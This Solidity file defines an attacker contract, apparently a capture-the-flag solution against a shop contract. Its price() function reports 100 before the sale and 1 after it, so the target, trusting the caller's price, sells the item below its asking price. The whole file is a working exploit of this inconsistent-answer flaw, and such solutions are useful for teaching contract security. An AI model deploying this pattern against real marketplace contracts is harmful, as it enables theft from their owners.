// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ShopI {
    function buy() external;

    function isSold() external view returns (bool);
}

contract ShopAttacker {
    uint _price = 100;
    ShopI shop;

    constructor(address _shop) {
        shop = ShopI(_shop);
    }

    function callBuy() external {
        shop.buy();
    }

    function price() external view returns (uint) {
        if (!shop.isSold()) {
            return _price;
        } else {
            return 1;
        }
    }
}
